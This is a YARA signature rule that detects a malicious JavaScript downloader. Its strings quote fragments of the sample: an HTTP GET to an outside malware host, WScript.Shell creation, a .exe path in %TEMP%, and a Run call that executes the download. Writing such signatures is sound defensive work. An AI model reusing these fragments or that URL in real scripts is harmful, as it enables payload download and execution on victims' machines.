rule sig_20160330_dff469966898148bb402e35c7a11b62a {
  meta:
    description = "datamaliciousorder - file 20160330_dff469966898148bb402e35c7a11b62a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c90e9d1742135f3ecc3d5a7fe06c68604afa61f2b696c485197a6ecc5c66370c"

  strings:
    $s1  = "_ME[_Y](\"GET\", \"http://ihlasauracleanmax.co/j3dlad\", false);" fullword ascii
    $s2  = "function _A1(_B0, _TT0){_MO = _MO * 1; return _B0 - _TT0;};" fullword ascii
    $s3  = "var _I = function _A() {return WScript[_JQ](\"WScript\"+\".Shell\");}(), _XS = 11;" fullword ascii
    $s4  = "if (_ME[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _Z() {return _I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"UHCVfEA6QW.ex\" + \"e\";};" fullword ascii
    $s6  = "function _Z0(){return _K + \"\";};" fullword ascii
    $s7  = "function _OM() {return ((_F == true) && (_F == _XE)) ? 1 : _MO;};" fullword ascii
    $s8  = "function _P(_J){_I[\"Run\"](_J, _MO, _MO);};" fullword ascii
    $s9  = "var _V0 = new this[\"Date\"]();" fullword ascii
    $s10 = " while (_G){" fullword ascii
    $s11 = "function _A0(){return 22;};" fullword ascii
    $s12 = "return _A1(_O0, _LS);" fullword ascii
    $s13 = "function _YQ(){return _JQ;};" fullword ascii
    $s14 = "function _TT(_R) {var _O = (1, 2, 3, 4, 5, _R); return _O;};" fullword ascii
    $s15 = "function _EB()" fullword ascii
    $s16 = "var _D = false;" fullword ascii
    $s17 = "_F = true; " fullword ascii
    $s18 = "_XE = true; " fullword ascii
    $s19 = "var _XE = false;" fullword ascii
    $s20 = "} catch(_T){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}